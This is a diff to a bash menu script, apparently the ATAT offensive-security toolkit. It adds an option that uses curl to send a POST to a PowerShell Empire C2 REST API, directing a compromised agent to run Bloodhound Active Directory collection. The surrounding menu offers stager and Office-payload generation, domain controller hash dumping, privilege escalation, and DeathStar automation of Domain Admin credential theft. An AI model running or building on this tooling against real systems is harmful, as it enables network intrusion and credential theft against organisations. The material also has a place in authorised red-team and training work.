@@ -191,7 +191,7 @@ echo -e "\E[1;34m===\e[97m[9] \e[95mEmpire & DeathStar  \e[97m  [Pledge Your All
 tput sgr0
 echo -e "\E[1;34m:::\e[97m[10]\e[31mWireless Attacks      \e[97m[Rule The Airwaves]   \E[1;34m"
 tput sgr0
-echo -e "\E[1;34m===\e[97m[0] \e[90mExit                   \e[97m[Exit ATAT]   \E[1;34m"
+echo -e "\E[1;34m===\e[97m[0] \e[90mExit                  \e[97m[Exit ATAT]   \E[1;34m"
 tput sgr0
 #echo -e "\E[1;34m:::\e[97m[12]\e[32mMulti-Target SNMP Enum\e[97m[SNMP Enumerate Many Targets]   \E[1;34m"
 #tput sgr0
@@ -841,18 +841,6 @@ select opt in "${options[@]}"
 	rm ~masscan_results*.txt
             echo -e "\E[1;34m::::: \e[97mAll TCP Ports Have Been Scanned!\E[1;34m:::::"
             ;;
-        "Bloodhound")
-        xterm -e neo4j console
-        xterm -e bloodhound
-        firefox http://localhost:7474
-			echo -e "\E[1;34m::::: \e[97mIn Firefox Interface\E[1;34m:::::"
-            echo -e "\E[1;34m::::: \e[97mLogin to Neo4j Console With User:neo4j & Password:neo4j and Change Defalt Password\E[1;34m:::::"
-            echo ""
-            echo -e "\E[1;34m::::: \e[97mIn Bloodhound Interface\E[1;34m:::::"
-            echo -e "\E[1;34m::::: \e[97mEnter bolt://127.0.0.1:7687 in Database Field\E[1;34m:::::"
-            echo -e "\E[1;34m::::: \e[97mEnter neo4j In Username Field\E[1;34m:::::"
-            echo -e "\E[1;34m::::: \e[97mEnter Newly Created Password In Password Field Unless You Left It As Defalut Of neo4j\E[1;34m:::::"
-			;;
         "Resume")
     masscan --resume paused.conf
 			;;           
@@ -866,6 +854,24 @@ select opt in "${options[@]}"
 		esac
 	done
 	        ;;
+	"Bloodhound")
+        xterm -e neo4j console &
+        sleep 10
+        xterm -e bloodhound &
+        sleep 30
+        firefox http://localhost:7474 &
+			echo -e "\E[1;34m::::: \e[97mIn Firefox Interface\E[1;34m:::::"
+            echo -e "\E[1;34m::::: \e[97mLogin to Neo4j Console With User:neo4j & Password:neo4j and Change Defalt Password\E[1;34m:::::"
+            echo ""
+            echo -e "\E[1;34m::::: \e[97mIn Bloodhound Interface\E[1;34m:::::"
+            echo -e "\E[1;34m::::: \e[97mEnter bolt://127.0.0.1:7687 in Database Field\E[1;34m:::::"
+            echo -e "\E[1;34m::::: \e[97mEnter neo4j In Username Field\E[1;34m:::::"
+            echo -e "\E[1;34m::::: \e[97mEnter Newly Created Password In Password Field Unless You Left It As Defalut Of neo4j\E[1;34m:::::"
+            echo ""
+            echo -e "\E[1;34m::::: \e[97mCheck Empire & DeathStar Menu For \"Execute Bloodhound Data Collection\" Option To Automate Bloodhound Data Collection Once A PSE Agent Is Active On Your Target\E[1;34m:::::"
+            echo ""
+            echo -e "\E[1;34m::::: \e[97mThe neo4j Firefox Interface Does Not Need To Remain Open\E[1;34m:::::"
+			;;
     "Main Menu")
             ~/ATAT/ATAT.sh
             ;;
@@ -1023,8 +1029,8 @@ echo -e "\E[1;34m::::: \e[97mTHIS SECTION ONLY WORKS FROM THE /root/ CONTEXT!! \
 echo -e "\E[1;34m::::: \e[97mIF YOU'RE NOT LOGGED IN AS root, DO NOT USE THESE OPTIONS!! \E[1;34m:::::"
 echo -e "\E[1;34m::::: \e[97mOnly Launch DeathStar (Step 2) If Your Goal Is To Automate Domain Admin Credential Acquisition \E[1;34m:::::"
 
-PS3='Enter your choice: ENTER=Options Menu | 22=Main Menu | 23=QUIT: '
-options=("Step 1 - Launch Powershell Empire & RESTful API" "Step 2 - Launch DeathStar (Optional)" "Step 3 - Acquire PSE REST API Permanent Token" "Start PSE Listener" "Get PSE Stagers" "Get PSE Agents" "Rename PSE Agent" "Generate PSE Stagers - Windows (mostly)" "Generate PSE Stagers - Windows/OSX/Linux" "Generate PSE Stagers - Windows Office File & CSharp Payload" "Windows Post-Exploitation" "Windows DC Hashdump" "Linux/OSX Post-Exploitation" "Get Post Ex Results From PSE Agent" "Get PSE Stored Credentials" "Windows Privilege Escalation" "Linux/OSX Privilege Escalation" "Kill PSE Listener" "Kill All PSE Listeners" "Restart PSE RESTful API" "Shutdown PSE RESTful API" "Main Menu" "Quit")
+PS3='Enter your choice: ENTER=Options Menu | 23=Main Menu | 24=QUIT: '
+options=("Step 1 - Launch Powershell Empire & RESTful API" "Step 2 - Launch DeathStar (Optional)" "Step 3 - Acquire PSE REST API Permanent Token" "Start PSE Listener" "Get PSE Stagers" "Get PSE Agents" "Rename PSE Agent" "Generate PSE Stagers - Windows (mostly)" "Generate PSE Stagers - Windows/OSX/Linux" "Generate PSE Stagers - Windows Office File & CSharp Payload" "Execute Bloodhound Data Collection" "Windows Post-Exploitation" "Windows DC Hashdump" "Linux/OSX Post-Exploitation" "Get Post Ex Results From PSE Agent" "Get PSE Stored Credentials" "Windows Privilege Escalation" "Linux/OSX Privilege Escalation" "Kill PSE Listener" "Kill All PSE Listeners" "Restart PSE RESTful API" "Shutdown PSE RESTful API" "Main Menu" "Quit")
 select opt in "${options[@]}"
 do
     case $opt in
@@ -1104,6 +1110,13 @@ do
             echo ""
             echo -e "\E[1;34m::::: \e[97mSpecial Instructions for ""windows/csharp_exe""
             launcher.src.zip created in the '/tmp/' directory \E[1;34m:::::"
+			;;
+		"Execute Bloodhound Data Collection")
+	pseauthtoken=~/ATAT/PSE_perm_token.txt
+    read -p 'Set PSE C2 (LHOST): ' userlistener; read -p 'Set PSE C2 API Port (API_LPORT): ' userport; read -p 'Set PSE Agent: ' useragent; read -p 'Search Entire Forest? True/False ' userforest;
+	curl --insecure -i -H "Content-Type: application/json" https://$userlistener:$userport/api/modules/powershell/situational_awareness/network/bloodhound?token=$(cat $pseauthtoken) -X POST -d '{"Agent":'\"$useragent\"',"Forest":'\"$userforest\"'}' >> ~/ATAT/Bloodhound_PSE.log
+	        echo -e "\E[1;34m::::: \e[97mxXx Bloodhound Data Collection Has Begun xXx\E[1;34m:::::"
+            echo -e "\E[1;34m::::: \e[97mResults Will Appear in ~/Empire/downloads/<agent_name>/agent.log Once The Background Task Has Been Completed\E[1;34m:::::"
 			;;
     	"Windows Post-Exploitation")
     inputfile=~/ATAT/PSE_windows_postex.txt
